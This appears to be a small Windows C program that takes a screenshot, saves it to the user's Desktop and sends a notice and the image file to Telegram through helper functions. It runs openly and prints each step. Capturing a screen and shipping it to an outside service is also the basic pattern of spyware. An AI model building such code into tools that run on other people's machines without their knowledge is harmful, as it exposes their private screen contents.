#include <stdio.h>
#include <windows.h>
#include "Screenshot.h"
#include "win_telegram.h"
#include <minwindef.h>

int main()
{
	printf("Starting screenshot capture...\n");
	screenshot();
	printf("Screenshot captured and saved to Desktop\\Screenshots\\capture.bmp\n");
	send_telegram_text("Screenshot captured and saved to Desktop\\Screenshots\\capture.bmp");
	char filePath[MAX_PATH];
	char* desktopPath = getenv("USERPROFILE");
	snprintf(filePath, sizeof(filePath), "%s\\Desktop\\Screenshots\\capture.bmp", desktopPath);
	printf("%s\n", filePath);
	if (send_telegram_file(filePath) == 0) {
		printf("Screenshot sent to Telegram successfully.\n");
	} else {
		printf("Failed to send screenshot to Telegram.\n");
	}

	return 0;
}